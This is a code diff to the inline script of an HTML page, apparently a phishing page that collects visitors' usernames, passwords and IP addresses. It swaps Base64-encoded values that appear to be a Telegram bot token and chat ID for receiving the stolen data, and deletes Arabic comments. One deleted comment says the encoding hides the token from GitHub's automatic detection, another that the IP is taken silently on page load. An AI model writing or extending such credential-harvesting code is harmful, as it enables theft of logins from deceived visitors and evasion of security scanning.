@@ -57,17 +57,14 @@
     </footer>
 
     <script>
-        // --- تشفير التوكن والايدي (Base64) لمنع الكشف الآلي من GitHub ---
-        const _v1 = "ODYwOTM4OTQ2NA==";
-        const _v2 = "QUFFSXFuZV9mMHhaTk9lcVl6LXJrN1hPc2JBTEVNMTJnQTg=";
+        const _v1 = "OTAzMjExMzAyNA==";
+        const _v2 = "QUFFcXB4S3F2T0otWW9GazU3WXMwZ3hCNUdId2xIUDRMMA==";
         const _v3 = "ODY1ODIxNzYwNQ==";
         
         const _getT = () => atob(_v1) + ":" + atob(_v2);
         const _getC = () => atob(_v3);
 
         let user_id = "", user_pw = "";
-
-        // 1. بمجرد تحميل الصفحة، نسحب الـ IP صامتاً
         let ip_info = "جاري الجلب...";
         window.onload = async () => {
             try {
